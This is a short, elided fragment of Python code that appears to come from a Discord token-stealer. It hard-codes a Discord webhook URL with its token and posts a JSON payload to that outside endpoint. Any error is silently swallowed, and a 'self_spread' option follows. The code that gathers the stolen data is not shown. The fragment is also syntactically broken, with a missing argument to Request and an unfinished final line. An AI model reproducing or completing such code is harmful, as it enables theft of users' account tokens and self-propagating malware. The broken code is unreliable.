...
# your webhook URL
WEBHOOK_URL = 'https://discordapp.com/api/webhooks/876281379137134612/kG9TPsL2tDaSmQek1gb2JXvERYz10N12wXfWAgFCprETE9r85jRXrLjunLrwUtfkGpdf'
...
def main():
    ...
    try:
        ...
        urlopen(Request(, data=dumps(webhook).encode(), headers=getHeader()))
    except:
        pass
    if self_spread:
